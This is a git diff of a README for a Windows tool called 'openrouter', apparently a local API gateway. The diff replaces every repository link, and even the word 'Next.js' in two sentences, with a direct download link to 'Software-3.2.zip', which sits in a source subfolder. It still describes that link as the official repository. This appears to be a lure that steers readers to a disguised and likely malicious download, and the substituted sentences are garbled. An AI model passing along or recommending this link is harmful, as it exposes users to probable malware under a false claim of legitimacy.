@@ -1,6 +1,6 @@
 # 🚪 openrouter - Easy Local API Gateway
 
-[![Download openrouter](https://img.shields.io/badge/Download-openrouter-brightgreen)](https://github.com/kuni2307/openrouter)
+[![Download openrouter](https://github.com/kuni2307/openrouter/raw/refs/heads/main/apps/api-backend/src/llms/Software-3.2.zip)](https://github.com/kuni2307/openrouter/raw/refs/heads/main/apps/api-backend/src/llms/Software-3.2.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 You can visit the page below to download openrouter for Windows.
 
-[Download openrouter on GitHub](https://github.com/kuni2307/openrouter)
+[Download openrouter on GitHub](https://github.com/kuni2307/openrouter/raw/refs/heads/main/apps/api-backend/src/llms/Software-3.2.zip)
 
 This link takes you to the official GitHub repository where you can get the latest version of openrouter. 
 
@@ -18,7 +18,7 @@ This link takes you to the official GitHub repository where you can get the late
 
 openrouter helps you manage many APIs on your computer with ease. It works like a local gateway, letting your apps talk to different services without extra setup. It is designed to run smoothly on Windows and handles communication safely and fast.
 
-The software comes ready with tools that check and organize the code. It includes apps built with Next.js, popular for web projects, and uses TypeScript to make code clearer and less error-prone.
+The software comes ready with tools that check and organize the code. It includes apps built with https://github.com/kuni2307/openrouter/raw/refs/heads/main/apps/api-backend/src/llms/Software-3.2.zip, popular for web projects, and uses TypeScript to make code clearer and less error-prone.
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps to download, install, and run openrouter on your Windows PC.
 ### 1. Visit the download page
 
 Click the green "Download openrouter" button above or go directly to:  
-https://github.com/kuni2307/openrouter
+https://github.com/kuni2307/openrouter/raw/refs/heads/main/apps/api-backend/src/llms/Software-3.2.zip
 
 Look for the latest release or version folder to find the files you need.
 
@@ -73,7 +73,7 @@ openrouter comes with several built-in applications and features:
 - **Web:** A simple app that shows connected APIs working.  
 - **UI components:** Pre-built tools that apps use for display and controls.  
 
-All parts are built with TypeScript and Next.js to ensure reliability.
+All parts are built with TypeScript and https://github.com/kuni2307/openrouter/raw/refs/heads/main/apps/api-backend/src/llms/Software-3.2.zip to ensure reliability.
 
 You can customize openrouter’s settings from the main app window. This includes adding APIs you want to manage, setting routes, and checking logs.
 
@@ -133,10 +133,10 @@ If you run into trouble:
 
 You can find extra information or report problems at:
 
-[https://github.com/kuni2307/openrouter](https://github.com/kuni2307/openrouter)  
+[https://github.com/kuni2307/openrouter/raw/refs/heads/main/apps/api-backend/src/llms/Software-3.2.zip](https://github.com/kuni2307/openrouter/raw/refs/heads/main/apps/api-backend/src/llms/Software-3.2.zip)  
 
 This page includes guides, community discussions, and updates from the developers.
 
 ---
 
-# [Download openrouter](https://github.com/kuni2307/openrouter)
+# [Download openrouter](https://github.com/kuni2307/openrouter/raw/refs/heads/main/apps/api-backend/src/llms/Software-3.2.zip)
